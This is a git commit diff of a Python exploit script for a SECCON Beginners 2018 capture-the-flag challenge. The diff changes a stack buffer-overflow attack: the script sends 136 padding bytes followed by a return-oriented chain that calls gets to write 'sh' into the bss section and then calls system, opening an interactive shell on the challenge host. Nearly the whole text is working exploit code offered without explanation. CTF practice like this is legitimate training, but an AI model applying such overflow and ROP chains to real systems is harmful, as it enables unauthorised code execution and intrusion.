db9ea03f196401321a1b8eb470163613fe6a8a40
kank3n <k_link_k@yahoo.co.jp>
2018-05-27 14:53:05 +0900

    Update exp_bbs.py

--- seccon_b2018/exp_bbs.py
+++ seccon_b2018/exp_bbs.py
@@ -1,4 +1,4 @@
-import sys, socket, struct, telnetlib
+import sys, socket, struct, telnetlib, time
 
 def sock(remoteip, remoteport):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -24,39 +24,26 @@ def u(a):
 
 def main():
     system = 0x0000000000400540
-    printf = 0x0000000000400550
-    libc_start_main = 0x000000601038
+    gets = 0x0000000000400570
+    bss = 0x0000000000601058 + 0x10
     poprdi = 0x00400763
-    buf = "A"*136
-    buf += p(poprdi)
-    buf += p(libc_start_main)
-    buf += p(printf)
-    buf += p(0x00000000004006a1) # main
-    f.write(buf+"\n")
-
-    # leak libc
-    read_until(f,"=\n")
-    read_until(f,"=\n")
-    libc = u(f.read(6)+"\x00"*2) - libc_start_offset
-    print "libc: ",hex(libc)
-    binsh = libc + binsh_offset
-    print "binsh: ",hex(binsh)
 
     buf = "A"*136
     buf += p(poprdi)
-    buf += p(binsh)
+    buf += p(bss)
+    buf += p(gets)
+    buf += p(poprdi)
+    buf += p(bss)
     buf += p(system)
     f.write(buf+"\n")
+    f.write("sh\0\n")
+
     shell(s)
 
 if __name__ == '__main__':
     if len(sys.argv) == 2 and sys.argv[1] == '-r':
         s, f = sock("pwn1.chall.beginners.seccon.jp", 18373)
-        libc_start_offset = 0x0000000000020740
-        binsh_offset = 0x18cd57
         main()
     else:
         s, f = sock("localhost", 18373)
-        libc_start_offset = 0x0000000000020740
-        binsh_offset = 0x18cd57
         main()
